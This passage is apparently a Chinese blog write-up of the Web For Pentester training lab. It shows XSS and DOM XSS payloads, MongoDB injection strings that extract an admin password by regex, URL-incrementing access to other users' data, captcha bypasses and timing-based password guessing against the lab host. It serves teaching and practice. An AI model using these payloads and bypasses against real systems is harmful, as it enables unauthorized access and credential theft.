-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/8-1.png" alt="8-1"></p>
-<p>8.2 构造payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&quot;method=&quot;POST&quot;&gt;&lt;script&gt;alert(&apos;simple&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/8-2.png" alt="8-2"></p>
-<p>九、Example 9</p>
-<p>9.1 源代码</p>
-<p>由源码可以看出，这个例子是一个基于DOM的XSS。这个实际上是个静态网页，不过依然存在漏洞。在这个例子中，可知当前页面渲染的时候，Javascript代码用URL得到锚点（URL中#后面这一部分），并且在客户端动态地写入页面。如果使用payload当做URL的一部分，这个可以用来触发XSS漏洞。因为直接在页面输出锚点id，所以考虑构建一个带XSS的锚点到达XSS目的</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%85%AB%EF%BC%89XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/9-1.png" alt="9-1"></p>
-<p>9.2 </p>
-<p>document.write()函数用于向文档写入HTML表达式或Javascript代码，将其多个参数（exp1,exp2,exp3,….）按顺序被追加到文档中。函数原型为document.write(exp1,exp2,exp3,….)。location.hash就是得到URL中从#开始的字符串。substring(1)就是得到#后的字符串</p>
-<p>9.3 构造Payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&lt;script&gt;alert(&apos;simpleware&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>发现XSS攻击没有成功，因为&lt;、&gt;和单引号被URL编码了</p>
-<hr>
-<h1 id="（九）MongoDB"><a href="#（九）MongoDB" class="headerlink" title="（九）MongoDB"></a>（九）MongoDB</h1><h2 id="【原理】-8"><a href="#【原理】-8" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）MongoDB是一个基于分布式文件存储的数据库。由C++语言编写。旨在为WEB应用提供可拓展的高性能数据存储解决方案</p>
-<p>（2）MongoDB是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富的、最像关系数据库的。它支持的数据结构非常松散，是类似json的bson格式，因此可以存储比较复杂的数据类型。MoongoDB最大的特点是它支持的查询语言非常强大，其语法有点类似于面向对象的查询语言，几乎可以实现类似关系数据库单表查询的绝大部分功能，而且还支持对数据建立索引</p>
-<h2 id="【步骤】-7"><a href="#【步骤】-7" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>一、Example 1</p>
-<p>1.1</p>
-<p>一个登陆界面。依据以往常用的知识，我们经常使用两种方法来绕过登陆，一是构造总是真实的条件，二是正确地终止SQL查询。通过阅读一些MongoDB文档，我们知道，在MongoDB中，or 1=1会被翻译为 || 1==1，可使用//或者&lt;!-来终止查询。在Username处输入’ || 1=1 //，提交</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B9%9D%EF%BC%89MongoDB/1-1.png" alt="1-1"></p>
-<p>1.2 登陆成功</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B9%9D%EF%BC%89MongoDB/1-2.png" alt="1-2"></p>
-<p>二、Example 2</p>
-<p>2.1 看到两个用户名</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B9%9D%EF%BC%89MongoDB/2-1.png" alt="2-1"></p>
-<p>2.2 单击其中一个用户，只得到一个用户的界面</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B9%9D%EF%BC%89MongoDB/2-2.png" alt="2-2"></p>
-<p>2.3 构造一些语句来推断admin的密码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=admin&apos; &amp;&amp; this.password.match(/./)//</span><br></pre></td></tr></table></figure>
-<p>经过部分url编码后：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=admin&apos;%20%26%26%20this.password.match(/./)//+%00</span><br></pre></td></tr></table></figure>
-<p>得到同样的结果，因为点.匹配除”\r \n”之外的任何单个字符</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B9%9D%EF%BC%89MongoDB/2-3.png" alt="2-3"></p>
-<p>2.4</p>
-<p>输入以下内容却无结果，说明猜测的密码zzzzz并不正确</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=admin&apos;%20%26%26%20this.password.match(/zzzzz/)//+%00</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B9%9D%EF%BC%89MongoDB/2-4.png" alt="2-4"></p>
-<p>2.5</p>
-<p>输入以下内容报错</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=admin&apos;%20%26%26%20this.passwordzz.match(/zzzzz/)//+%00</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B9%9D%EF%BC%89MongoDB/2-5.png" alt="2-5"></p>
-<p>2.6</p>
-<p>通过前面的实验，我们可以得到一个结论：当admin的密码匹配我们构造的正则表达式时，我们可以得到正确的结果，而不匹配的话则无结果。根据这个我们就可以进行猜测admin的密码了</p>
-<p>2.7</p>
-<p>在开始猜测admin的密码前，我们先介绍一点正则匹配的知识。^匹配输入字符串的开始位置。点.匹配除”\r \n”之外的任何单个字符。*匹配前面的子表达式任意次。$匹配输入字符串的结束位置。下面我们可以举例说明一下。我们假设密码为aab时，使用下面的正则表达式进行匹配，匹配结果分别为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/^a.*$/	匹配</span><br><span class="line">/^a$/	不匹配</span><br><span class="line">/^aa.*$/	匹配</span><br><span class="line">/^aa$/	不匹配</span><br><span class="line">/^aaa.*$/	不匹配</span><br><span class="line">/^aab.*$/	匹配</span><br><span class="line">/^aab$/	匹配，密码找到</span><br></pre></td></tr></table></figure>
-<p>2.8</p>
-<p>根据这个，我们可以编写脚本来破解admin的密码，还可以使用工具Burpsuite进行爆破</p>
-<hr>
-<h1 id="（十）Authorization"><a href="#（十）Authorization" class="headerlink" title="（十）Authorization"></a>（十）Authorization</h1><h2 id="【原理】-9"><a href="#【原理】-9" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）授权问题在Web应用程序中是非常常见的。本实验的练习汇集了一下常见的漏洞的例子。现代的web开发框架往往保护各种注入，但不能自动顾及这类问题的自动，因为他们无法理解其背后的商业逻辑。授权问题不能真正由自动web扫描仪进行测试，因为同样的原因，这就是为什么它往往是一个很好的漏洞来源，重要的是要知道如何测试它们。下面的部分“量分配”也是一个授权问题</p>
-<h2 id="【步骤】-8"><a href="#【步骤】-8" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>一、Example 1</p>
-<p>1.1 登陆</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/1-1.png" alt="1-1"></p>
-<p>1.2 看到两条信息</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/1-2.png" alt="1-2"></p>
-<p>1.3 分别查看两条信息，并且把URL地址记录下来</p>
-<p>分别是：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vulnerable/authorization/example1/infos/1</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vulnerable/authorization/example1/infos/2</span><br></pre></td></tr></table></figure>
-<p>发现除了最后的数字是递增的，其他都一样</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/1-3-1.png" alt="1-3-1"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/1-3-2.png" alt="1-3-2"></p>
-<p>1.4 点击Logout退出登录</p>
-<p>退出登陆后，在任意一个地方输入Confidential的URL，会发现直接访问Confidential的信息，不需要在经过用户名密码登录</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/1-4-1.png" alt="1-4-1"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/1-4-2.png" alt="1-4-2"></p>
-<p>二、Example 2</p>
-<p>2.1 同样的用提供的账号密码登录，看到两条信息</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/2-1.png" alt="2-1"></p>
-<p>2.2 分别点击两个信息，观察URL，按照递增输入3，进入user2的内容</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/2-2.png" alt="2-2"></p>
-<p>2.3 继续递增到4也可以看到新的内容</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/2-3.png" alt="2-3"></p>
-<p>三、Example 3</p>
-<p>3.1 同样的用提供的账号密码登录，看到两条信息</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/3-1.png" alt="3-1"></p>
-<p>3.2 分别点击2条信息，其URL还是递增的，但是已经无法修改而访问，但是多了”Edit this info”，点击得到如下页面</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/3-2.png" alt="3-2"></p>
-<p>3.3 修改URL数字1为2，直接访问user1(2)的编辑信息界面</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/3-3.png" alt="3-3"></p>
-<p>3.4 修改为3，跳转到user2的内容编辑页面</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%EF%BC%89Authorization/3-4.png" alt="3-4"></p>
-<hr>
-<h1 id="（十一）Captcha"><a href="#（十一）Captcha" class="headerlink" title="（十一）Captcha"></a>（十一）Captcha</h1><h2 id="【原理】-10"><a href="#【原理】-10" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）关于captcha的验证，有各种各样的captcha bypass方式</p>
-<h2 id="【步骤】-9"><a href="#【步骤】-9" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>一、Example 1</p>
-<p>1.1 验证码，想办法绕过</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/1-1.png" alt="1-1"></p>
-<p>1.2 输入验证码，提交，使用Burpsuite拦截</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/1-2.png" alt="1-2"></p>
-<p>1.3 直接删去captcha及其参数，得到响应吗 200，绕过成功</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/1-3.png" alt="1-3"></p>
-<p>1.4 单击右键，选择”Request in browser” - “in original session”</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/1-4.png" alt="1-4"></p>
-<p>1.5 单击”copy”</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/1-5.png" alt="1-5"></p>
-<p>1.6 在浏览器粘贴刚才复制的网站，单击”Repeat request”</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/1-6.png" alt="1-6"></p>
-<p>1.7 可以看到在浏览器完成我们操作的请求，返回”Success!!!”</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/1-7.png" alt="1-7"></p>
-<p>二、Example 2</p>
-<p>2.1 captcha参数换成answer，操作和Example1一样，不赘述</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/2-1.png" alt="2-1"></p>
-<p>三、Example 3</p>
-<p>3.1 多了一条cookie信息</p>
-<p>发现Request信息中多了一条cookie信息，发现其值其实就是验证码的值，将URL中的captcha的值改为cookie的值，成功绕过captcha验证，登陆成功</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/3-1.png" alt="3-1"></p>
-<p>四、Example 4</p>
-<p>4.1 输入正确一次，就会有一个session</p>
-<p>之后一直使用这个session就可以了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/4-1.png" alt="4-1"></p>
-<p>五、Example 5</p>
-<p>5.1 枚举</p>
-<p>发现验证码就那几个单词，可以通过枚举单词进行captcha验证</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/5-1.png" alt="5-1"></p>
-<p>5.2 将图片保存下来，并把验证码写成文件名</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/5-2.png" alt="5-2"></p>
-<p>5.3 编写Python代码，返回页面存在Success则说明登陆成功</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/5-3.png" alt="5-3"></p>
-<p>六、Example 6</p>
-<p>6.1 算术运算的验证码</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/6-1.png" alt="6-1"></p>
-<p>6.2 直接匹配然后提交数据</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/6-2.png" alt="6-2"></p>
-<p>6.3 看到Success说明成功</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89Captcha/6-3.png" alt="6-3"></p>
-<hr>
-<h1 id="（十二）Authentication"><a href="#（十二）Authentication" class="headerlink" title="（十二）Authentication"></a>（十二）Authentication</h1><h2 id="【原理】-11"><a href="#【原理】-11" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）身份认证bypass练习。Authentication即身份验证，在.NET Framework安全中，通过对照某些机构检查用户的凭据，发现和验证主体标识的过程</p>
-<h2 id="【步骤】-10"><a href="#【步骤】-10" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>一、Example 1</p>
-<p>1.1 提示我们用户名是root，但是密码不知道，需要去猜测，试一下password</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/1-1.png" alt="1-1"></p>
-<p>1.2 密码错误，再试一下密码admin</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/1-1.png" alt="1-1"></p>
-<p>1.3 登陆成功，密码就是admin</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/1-3.png" alt="1-3"></p>
-<p>二、Example 2</p>
-<p>2.1 提示账号是hacker，密码无法猜测，只能去找</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/2-1.png" alt="2-1"></p>
-<p>2.2 使用脚本进行猜测</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/2-2.png" alt="2-2"></p>
-<p>2.3 解密过程如下</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/2-3.png" alt="2-3"></p>
-<p>2.4 根据响应时间判断密码</p>
-<p>由猜解过程中花费的时间可知猜解字母p时处理的时间最长，所以密码的首字母为p，猜解结果为25既字母p，提示选择某个字符，这里选择25既字母p继续进行猜解。同理得到第二个字母。。。最后密码是p4ssw0rd</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/2-4.png" alt="2-4"></p>
-<p>2.5 用猜测的密码进行登录</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/2-5.png" alt="2-5"></p>
-<p>2.6 登陆成功</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/2-6.png" alt="2-6"></p>
-<p>三、Example 5</p>
-<p>3.1 注册业务逻辑漏洞</p>
-<p>除了登陆之外，还有注册功能，猜测是业务逻辑漏洞，注册的时候没有做大小写判断，产生了注册覆盖，那么注册一个Admin就可以进行登陆了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/3-1.png" alt="3-1"></p>
-<p>3.2 注册用户Admin，密码123456，提交</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/3-2.png" alt="3-2"></p>
-<p>3.3 成功注册并且以admin用户登陆</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/3-3.png" alt="3-3"></p>
-<p>四、Example 4</p>
-<p>4.1 同样有注册功能，mysql会忽略掉随在字符串后面的空格，利用这个注册覆盖</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/4-1.png" alt="4-1"></p>
-<p>4.2 注册时，admin后面有空格</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/4-2.png" alt="4-2"></p>
-<p>4.3 成功注册并且以admin身份登陆</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Authentication/4-3.png" alt="4-3"></p>
-<hr>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">基础知识点</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/03/11/Web-For-Pentester/">展开全文 >></a>
         </p>
       
 
